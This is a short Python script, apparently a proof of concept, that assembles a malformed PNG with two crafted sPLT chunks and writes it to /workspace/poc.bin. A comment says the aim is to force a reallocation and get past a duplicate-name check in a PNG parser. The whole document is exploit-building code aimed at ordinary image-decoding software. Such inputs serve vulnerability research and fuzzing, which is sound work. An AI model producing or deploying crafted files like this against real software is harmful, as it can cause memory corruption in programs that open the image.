sig=b'\x89PNG\r\n\x1a\n'
def ch(t,d): return struct.pack('>I',len(d))+t+d+struct.pack('>I',zlib.crc32(t+d)&0xffffffff)
ihdr=ch(b'IHDR', struct.pack('>IIBBBBB',1,1,8,6,0,0,0))
# first sPLT stored, second huge sPLT causes realloc and duplicate name bypass? use different name to allow
body1=b'X\x00'+b'\x01'+b'\x00\x00\x00\x00\x00\x00'
body2=b'Y'*79+b'\x00'+b'\x08'+b'\x00\x01\x00\x02\x00\x03\x00\x04\x00\x05'
splt1=ch(b'sPLT', body1)
splt2=ch(b'sPLT', body2)
raw=b'\x00\x00\x00\x00\x00'
idat=ch(b'IDAT', zlib.compress(raw))
iend=ch(b'IEND', b'')
payload=b'\x00\x86'+sig+ihdr+splt1+splt2+idat+iend
open('/workspace/poc.bin','wb').write(payload)
print(len(payload))
